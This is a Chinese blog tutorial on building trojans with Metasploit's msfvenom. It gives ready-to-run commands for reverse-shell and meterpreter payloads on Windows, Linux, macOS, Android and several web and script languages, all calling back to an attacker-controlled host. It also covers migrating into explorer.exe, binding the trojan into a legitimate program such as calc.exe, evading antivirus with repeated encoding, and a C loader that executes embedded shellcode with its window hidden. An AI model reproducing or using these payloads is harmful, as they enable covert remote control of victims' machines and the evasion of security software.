{"title":"MsfVenom木马制作","uid":"5531dbf9522eeb91cbe011b05c7645c2","slug":"MsfVenom木马制作","date":"2022-08-27T07:51:03.000Z","updated":"2022-08-27T06:46:28.682Z","comments":true,"path":"api/articles/MsfVenom木马制作.json","keywords":null,"cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimage.3001.net%2Fimages%2F20200622%2F1592755406_5eef84ceef5dd.jpg%21small&refer=http%3A%2F%2Fimage.3001.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1664122130&t=da09b74224ff033a65e1aec10ad8ebb8","content":"<h2 id=\"一、msfvenom基本用法\"><a href=\"#一、msfvenom基本用法\" class=\"headerlink\" title=\"一、msfvenom基本用法\"></a>一、msfvenom基本用法</h2><h3 id=\"1-功能介绍\"><a href=\"#1-功能介绍\" class=\"headerlink\" title=\"1. 功能介绍\"></a>1. 功能介绍</h3><p>​\t\t  msfvenom的功能：常用于生成木马，在目标机器上执行，在本地机器kall中上线，与反弹Shell类似。MSFVenom可以生成两种类型的攻击载荷：</p>\n<p>​\t\t        (1) <strong>Payload</strong> ：Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意程序，而在Metasploit中<code>Payload</code>是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。</p>\n<p>​\t\t(2) <strong>Shellcode</strong> ：Shellcode是Payload中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。Shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令之后，才会提供一个<strong>命令行shell</strong>。</p>\n<h3 id=\"2-攻击载荷分类\"><a href=\"#2-攻击载荷分类\" class=\"headerlink\" title=\"2. 攻击载荷分类\"></a>2. 攻击载荷分类</h3><p>​\t\t(1)<strong>Single</strong>是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于SinglePayload是完全独立的，所以其生成的Payload通常很大。</p>\n<p>​\t\t(2)<strong>Stager</strong>这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。 I</p>\n<p>​\t\t(3) <strong>Stage</strong>是Stager Payload下的一种Payload组件，这种Payload可以提供更加高级的功能，<code>而且没有大小限制</code>。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">single Payload的格式为：<span class=\"token operator\">&lt;</span>target<span class=\"token operator\">></span>/<span class=\"token operator\">&lt;</span>single<span class=\"token operator\">></span>如：windows/powershel1_bind_tcp\nStager/Stage Payload的格式为：<span class=\"token operator\">&lt;</span>target<span class=\"token operator\">></span>/<span class=\"token operator\">&lt;</span>stage<span class=\"token operator\">></span>/<span class=\"token operator\">&lt;</span>stager<span class=\"token operator\">></span>如：windows/meterpreter/reverse_tcp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"3-参数介绍\"><a href=\"#3-参数介绍\" class=\"headerlink\" title=\"3. 参数介绍\"></a>3. 参数介绍</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">-p, --payload \t\t\t指定需要使用的payload。使用自定义的payload，请使用-<span class=\"token punctuation\">;</span>或者stdin指定\n-l, --list \t\t\t\t\t列出指定模块的所有可用资源，模块类型包括：payloads, encoders, nops, all\n-n, --nopsled \t\t \t为pay1oad预先指定一个NOP滑动长度\n-f, --format \t\t\t\t指定输出格式\n-e, --encoder \t\t\t指定需要使用的编码\n-a, --arch \t\t\t\t\t指定payload的目标架构 x64 x86\n\t\t--platform \t\t\t指定payload的目标平台\n-s, --space \t\t\t\t设定有效攻击荷载的最大长度\n-b, --bad-chars \t\t设定规避字符集，比如：<span class=\"token operator\">&amp;</span> <span class=\"token comment\">#039; \\x00\\xff&amp; #039;</span>\n-i, --iterations \t\t指定payload的编码次数，绕杀毒\n-c, --add-code \t\t\t指定一个附加的win32 shellcode文件\n-x, --template \t\t\t指定一个自定义的可执行文件作为模板\n-k, --keep \t\t\t\t\t保护模板程序的动作，注入的payload作为一个新的进程运行\n-payload-options \t\t列举payload的标准选项\n-o, --out \t\t\t\t\t将pavload保存到指定的文件路径\n-v, --var-name \t\t\t指定一个自定义的变量，以确定输出格式\n-shellest \t\t\t\t\t最小化生成payload\n\n查看payload设置：\nmsfvenom -p windows/meterpreter/reverse_tcp --list-options\n\n要查看支持哪些平台，使用参数：msfvenom--list platforms，支持哪些输出格式，--list formats，以此类推<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"4-小试牛刀\"><a href=\"#4-小试牛刀\" class=\"headerlink\" title=\"4. 小试牛刀\"></a>4. 小试牛刀</h3><ol>\n<li>执行以下指令，将会生成一个文件名为shell.exe的Windows可执行程序，下载到Windows上执行，将会在进程中看到该程序。</li>\n</ol>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.2.14 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> -f exe -o shell.exe\nmsfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.2.14 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> -f exe <span class=\"token operator\">></span> shell.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<ol start=\"2\">\n<li>使用MSF的监听模块</li>\n</ol>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">use exploit/multi/handler\n<span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_tcp <span class=\"token comment\">#与生成木马所使用的payload对应上就行</span>\nshow options\n<span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.2.14\n<span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">4444</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>shell.exe执行后，界面反弹到meterpreter中</p>\n<h3 id=\"5-进程注入\"><a href=\"#5-进程注入\" class=\"headerlink\" title=\"5. 进程注入\"></a>5. 进程注入</h3><p>开启 <strong><code>exploit/multi/handler</code></strong> 后，运行shell.exe上线。就算在Windows的任务管理器中结束掉shell.exe的进程连接也不会下线。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.2.14 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> <span class=\"token assign-left variable\">prpendmigrateprocess</span><span class=\"token operator\">=</span>explorer.exe <span class=\"token assign-left variable\">prependmigrate</span><span class=\"token operator\">=</span>true -f exe <span class=\"token operator\">></span> shell.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"6-程序捆绑\"><a href=\"#6-程序捆绑\" class=\"headerlink\" title=\"6. 程序捆绑\"></a>6. 程序捆绑</h3><p>直接将木马与某一个应用程序进行捆绑，当用户点击木马运行时，不仅木马上线，而且程序也会正常运行。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.2.14 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> -a x86 --platform windows -x calc.exe -k -f exe -o mycalc.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"7-木马免杀\"><a href=\"#7-木马免杀\" class=\"headerlink\" title=\"7. 木马免杀\"></a>7. 木马免杀</h3><p>使用编码和代码混淆生成木马</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.2.14 <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> -e x86/shikata_ga_nai -i <span class=\"token number\">10</span>-f exe <span class=\"token operator\">></span> shell.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h2 id=\"二、各类木马\"><a href=\"#二、各类木马\" class=\"headerlink\" title=\"二、各类木马\"></a>二、各类木马</h2><p>MSFVenom支持生成以下格式的可执行文件：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">asp, aspx, aspx-exe, axis2, d11, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop- vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"1-Linux\"><a href=\"#1-Linux\" class=\"headerlink\" title=\"1.  Linux\"></a>1.  Linux</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p linux/×86/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f elf <span class=\"token operator\">></span> shell.elf\n\nmsfvenom -p linux/×86/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -e -f elf -a x86 --platform linux -o shell<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"2-Windows\"><a href=\"#2-Windows\" class=\"headerlink\" title=\"2.  Windows\"></a>2.  Windows</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f exe <span class=\"token operator\">></span> shell.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"3-Mac\"><a href=\"#3-Mac\" class=\"headerlink\" title=\"3. Mac\"></a>3. Mac</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p osx/×86/shell_reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f macho <span class=\"token operator\">></span> shell.macho<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"4-安卓app\"><a href=\"#4-安卓app\" class=\"headerlink\" title=\"4. 安卓app\"></a>4. 安卓app</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p android/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> <span class=\"token operator\">></span>shell.apk<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"5-BASH\"><a href=\"#5-BASH\" class=\"headerlink\" title=\"5.  BASH\"></a>5.  BASH</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p cmd/unix/reverse_bash <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f raw <span class=\"token operator\">></span> shell.sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"6-PERL\"><a href=\"#6-PERL\" class=\"headerlink\" title=\"6. PERL\"></a>6. PERL</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p cmd/unix/reverse_perl <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f raw <span class=\"token operator\">></span> shell.pl<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"7-C\"><a href=\"#7-C\" class=\"headerlink\" title=\"7. C\"></a>7. C</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/shell_reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -b \"<span class=\"token punctuation\">\\</span>x00<span class=\"token punctuation\">\\</span>x0a<span class=\"token punctuation\">\\</span>xOd” -a x86 --platform win -f c<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"8-Python\"><a href=\"#8-Python\" class=\"headerlink\" title=\"8. Python\"></a>8. Python</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p cmd/unix/reverse_python <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f raw <span class=\"token operator\">></span> shell.py<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"9-ASP\"><a href=\"#9-ASP\" class=\"headerlink\" title=\"9. ASP\"></a>9. ASP</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f asp <span class=\"token operator\">></span> shell.asp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"10-PHP\"><a href=\"#10-PHP\" class=\"headerlink\" title=\"10. PHP\"></a>10. PHP</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p php/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f raw -o test.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"11-JSP\"><a href=\"#11-JSP\" class=\"headerlink\" title=\"11. JSP\"></a>11. JSP</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p java/jsp_shell_reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f raw <span class=\"token operator\">></span> shell.jsp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"12-PowerShell\"><a href=\"#12-PowerShell\" class=\"headerlink\" title=\"12. PowerShell\"></a>12. PowerShell</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f psh-reflection <span class=\"token operator\">></span> shell.ps1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h2 id=\"三、免杀ShellCode\"><a href=\"#三、免杀ShellCode\" class=\"headerlink\" title=\"三、免杀ShellCode\"></a>三、免杀ShellCode</h2><h3 id=\"1-支持的源码格式\"><a href=\"#1-支持的源码格式\" class=\"headerlink\" title=\"1.  支持的源码格式\"></a>1.  支持的源码格式</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb. ruby, sh, vbapplication, vbscript<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"2-生成C语言的ShellCode\"><a href=\"#2-生成C语言的ShellCode\" class=\"headerlink\" title=\"2. 生成C语言的ShellCode\"></a>2. 生成C语言的ShellCode</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>PORT<span class=\"token operator\">></span> -f c <span class=\"token operator\">></span> shellcode.c<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"3-编译shellcode-c\"><a href=\"#3-编译shellcode-c\" class=\"headerlink\" title=\"3.  编译shellcode.c\"></a>3.  编译shellcode.c</h3><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n\n<span class=\"token comment\">// 去除黑窗口</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">comment</span><span class=\"token punctuation\">(</span>linker<span class=\"token punctuation\">,</span> </span><span class=\"token string\">\"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token comment\">// msfvenom生成的shellcode</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> shellcode<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>\n    <span class=\"token string\">\"\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x31\\xff\\x0f\\xb7\\x4a\\x26\"</span>\n    <span class=\"token string\">\"\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\x49\"</span>\n    <span class=\"token string\">\"\\x75\\xef\\x52\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x57\\x01\\xd0\\x8b\\x40\\x78\"</span>\n    <span class=\"token string\">\"\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x8b\\x58\\x20\\x8b\\x48\\x18\\x50\\x01\\xd3\"</span>\n    <span class=\"token string\">\"\\x85\\xc9\\x74\\x3c\\x31\\xff\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xc0\\xc1\"</span>\n    <span class=\"token string\">\"\\xcf\\x0d\\xac\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\"</span>\n    <span class=\"token string\">\"\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\"</span>\n    <span class=\"token string\">\"\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\"</span>\n    <span class=\"token string\">\"\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\"</span>\n    <span class=\"token string\">\"\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\"</span>\n    <span class=\"token string\">\"\\x07\\x89\\xe8\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\"</span>\n    <span class=\"token string\">\"\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\xc0\\xa8\\x02\\x0e\\x68\\x02\"</span>\n    <span class=\"token string\">\"\\x00\\x22\\xb8\\x89\\xe6\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\"</span>\n    <span class=\"token string\">\"\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\"</span>\n    <span class=\"token string\">\"\\xff\\xd5\\x85\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\\x00\\x00\"</span>\n    <span class=\"token string\">\"\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\"</span>\n    <span class=\"token string\">\"\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\"</span>\n    <span class=\"token string\">\"\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\"</span>\n    <span class=\"token string\">\"\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x68\\x00\"</span>\n    <span class=\"token string\">\"\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x68\"</span>\n    <span class=\"token string\">\"\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e\\x5e\\xff\\x0c\\x24\\x0f\\x85\\x70\\xff\"</span>\n    <span class=\"token string\">\"\\xff\\xff\\xe9\\x9b\\xff\\xff\\xff\\x01\\xc3\\x29\\xc6\\x75\\xc1\\xc3\\xbb\"</span>\n    <span class=\"token string\">\"\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">RunShellCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Memory<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 申请EXECUTE属性内存</span>\n    Memory <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAlloc</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MEM_COMMIT <span class=\"token operator\">|</span> MEM_RESERVE<span class=\"token punctuation\">,</span> PAGE_EXECUTE_READWRITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>Memory<span class=\"token punctuation\">,</span> shellcode<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 执行shellcode</span>\n    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>Memory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">RunShellCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"四、在线查杀平台\"><a href=\"#四、在线查杀平台\" class=\"headerlink\" title=\"四、在线查杀平台\"></a>四、在线查杀平台</h2><h3 id=\"1-Virus-Total\"><a href=\"#1-Virus-Total\" class=\"headerlink\" title=\"1.  Virus Total\"></a>1.  <a href=\"https://www.virustotal.com/gui/home/upload\"><strong>Virus Total</strong></a></h3><h3 id=\"2-VirSCAN\"><a href=\"#2-VirSCAN\" class=\"headerlink\" title=\"2. VirSCAN\"></a>2. <a href=\"https://www.virscan.org/\"><strong>VirSCAN</strong></a></h3><h3 id=\"3-Jotti\"><a href=\"#3-Jotti\" class=\"headerlink\" title=\"3. Jotti\"></a>3. <a href=\"https://virusscan.jotti.org/#\"><strong>Jotti</strong></a></h3><h3 id=\"4-kaspersky\"><a href=\"#4-kaspersky\" class=\"headerlink\" title=\"4.  kaspersky\"></a>4.  <a href=\"https://opentip.kaspersky.com/\"><strong>kaspersky</strong></a></h3><h3 id=\"5-腾讯哈勃分析系统\"><a href=\"#5-腾讯哈勃分析系统\" class=\"headerlink\" title=\"5.  腾讯哈勃分析系统\"></a>5.  <a href=\"https://habo.qq.com/\"><strong>腾讯哈勃分析系统</strong></a></h3>","feature":true,"text":"一、msfvenom基本用法1. 功能介绍​ msfvenom的功能：常用于生成木马，在目标机器上执行，在本地机器kall中上线，与反弹Shell类似。MSFVenom可以生成两种类型的攻击载荷： ​ (1) Payload ：Payload中包含攻击进入目标主机后需要在远程系统...","link":"","photos":[],"count_time":{"symbolsCount":"6.8k","symbolsTime":"6 mins."},"categories":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/categories/网络安全.json"},{"name":"工具使用","slug":"网络安全/工具使用","count":3,"path":"api/categories/网络安全/工具使用.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/tags/网络安全.json"},{"name":"工具使用","slug":"工具使用","count":3,"path":"api/tags/工具使用.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81msfvenom%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95\"><span class=\"toc-text\">一、msfvenom基本用法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D\"><span 